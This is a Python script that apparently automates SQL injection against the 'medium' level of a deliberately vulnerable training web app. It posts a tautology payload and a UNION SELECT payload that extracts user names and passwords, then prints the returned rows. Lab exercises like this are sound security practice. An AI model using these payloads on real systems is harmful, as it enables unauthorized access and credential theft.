#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from conf import BASE_URL
from util import http_post

URL = BASE_URL + "/vulnerabilities/sqli/"

DIFFICULTY = "medium"

PAYLOADS = [
    "1 OR 1=1 -- ",
    "1 UNION SELECT first_name, password FROM users -- "
]

# -----------------------

def sqli_medium():
    global URL, DIFFICULTY, PAYLOADS

    print("==================================")
    print(f"[INFO] - SQLi {DIFFICULTY}")
    
    for payload in PAYLOADS:
        post_data = f"id={payload}&Submit=Submit"
        r = http_post(URL, DIFFICULTY, data=post_data)
        
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})
        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                print(elem)
